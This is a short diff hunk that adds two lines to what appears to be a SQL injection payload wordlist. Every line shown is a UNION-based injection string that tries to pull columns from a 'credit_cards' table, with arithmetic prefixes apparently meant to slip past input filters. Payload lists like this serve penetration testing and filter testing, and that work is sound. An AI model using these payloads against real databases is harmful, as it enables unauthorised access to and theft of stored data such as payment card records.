@@ -106,6 +106,8 @@ TRUE DIV(SELECT ((ORD(LEFT
 1001-\N union select 1,2,3,4 from credit_cards
 1001-true union select 1,2,3,4 from credit_cards
 (1001-true) union select 1,2,3,4 from credit_cards
+(1001-'1') union select 1,2,3,4 from credit_cards
+(1001-@version) union select 1,2,3,4 from credit_cards
 1-(1001-true) union select 1,2,3,4 from credit_cards
 1001-false-false union select 1,2,3,4 from credit_cards
 1001-false-NULL union select 1,2,3,4 from credit_cards
